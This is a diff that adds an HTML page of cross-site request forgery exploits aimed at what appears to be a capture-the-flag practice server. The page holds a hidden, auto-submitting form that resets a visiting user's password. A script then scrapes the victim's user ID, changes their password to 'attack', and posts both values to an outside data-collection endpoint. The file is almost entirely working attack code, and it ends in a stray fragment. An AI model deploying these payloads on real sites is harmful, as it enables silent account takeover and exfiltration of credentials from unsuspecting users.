@@ -1,0 +1,36 @@
+<iframe width="0" height="0" frameborder="0" name="stealthcsrf" id="stealthcsrf" style="display: none"></iframe>
+<body onload="document.forms[0].submit()">
+    <div width="0" height="0" style="display: none">
+        <form method="post" action="http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php" target="stealthcsrf">
+            <input name="pw" type="hidden" value="csrf" />
+            <input type="submit" value="Update" />
+        </form>
+    </div>
+</body>
+
+<script>
+    async function csrfExploit() {
+        try {
+            let url = "http://ctf.segfaulthub.com:7777/csrf_2/mypage.php";
+            let response = await fetch(url);
+            let html = await response.text();
+            let parser = new DOMParser();
+            let dom = parser.parseFromString(html, "text/html");
+            let userId = dom.forms[0].id.placeholder;
+
+            let new_pw = "attack";
+            let mypageUrl = "http://ctf.segfaulthub.com:7777/csrf_2/mypage_update.php";
+            let attackerUrl = "https://eodhhttu9beaqkb.m.pipedream.net";
+
+            await fetch(mypageUrl, { method: "POST", body: new URLSearchParams({ pw: new_pw }) });
+            await fetch(attackerUrl, { method: "POST", body: new URLSearchParams({ userId, new_pw }) });
+        } catch (error) {
+            let attackerUrl = "https://eodhhttu9beaqkb.m.pipedream.net?error=" + error;
+            await fetch(attackerUrl);
+        }
+    }
+
+    csrfExploit();
+</script>
+
+<
